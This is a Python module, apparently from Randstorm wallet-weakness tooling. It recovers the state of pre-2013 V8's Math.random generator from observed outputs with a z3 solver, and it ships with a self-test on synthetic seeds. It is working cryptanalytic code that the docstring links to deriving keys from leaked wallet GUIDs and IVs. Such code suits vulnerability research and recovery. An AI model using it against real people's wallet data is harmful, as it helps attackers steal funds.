#!/usr/bin/env python3
"""Recover the V8 `random_base` state from observed Math.random outputs.

Pre-2013-09 V8 (the Randstorm mass window) uses `random_base`:

    s0' = 18273 * (s0 & 0xFFFF) + (s0 >> 16)      (uint32)
    s1' = 36969 * (s1 & 0xFFFF) + (s1 >> 16)
    r   = (s0' << 14) + (s1' & 0x3FFFF)           (uint32)

Given a few consecutive observations of `r` (e.g. derived from a leaked
wallet GUID/IV generated in the same browser session), the 64-bit state is
recovered with a bit-vector solver. The pool then no longer needs any seed
enumeration: only the time XORs (T1/T2) remain unknown.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from v8_random import RandomBaseE1  # noqa: E402

MASK32 = 0xFFFFFFFF


def simulate_outputs(s0, s1, count):
    """Ground-truth sequence for tests: raw uint32 Math.random outputs."""
    generator = RandomBaseE1(s0, s1)
    return [generator.next_u32() for _ in range(count)]


def recover_state(outputs):
    """Return (s0, s1) such that the sequence reproduces `outputs`."""
    import z3

    s0 = z3.BitVec("s0", 32)
    s1 = z3.BitVec("s1", 32)
    current0, current1 = s0, s1
    solver = z3.Solver()
    for value in outputs:
        current0 = 18273 * (current0 & 0xFFFF) + z3.LShR(current0, 16)
        current1 = 36969 * (current1 & 0xFFFF) + z3.LShR(current1, 16)
        solver.add(((current0 << 14) + (current1 & 0x3FFFF)) == value)
    if solver.check() != z3.sat:
        raise RuntimeError("state not recoverable from the given outputs")
    model = solver.model()
    return model[s0].as_long(), model[s1].as_long()


def verify_recovery(s0, s1, recovered, extra=16):
    """Check the recovered state reproduces outputs beyond the observed ones."""
    expected = simulate_outputs(s0, s1, extra)
    actual = simulate_outputs(*recovered, extra)
    return expected == actual


if __name__ == "__main__":
    true_s0, true_s1 = 0xDEADBEEF, 0x12345678
    observed = simulate_outputs(true_s0, true_s1, 3)
    recovered = recover_state(observed)
    assert recovered == (true_s0, true_s1), (recovered, (true_s0, true_s1))
    assert verify_recovery(true_s0, true_s1, recovered)
    print(f"state recovery self-test ok: {recovered[0]:08x} {recovered[1]:08x}")
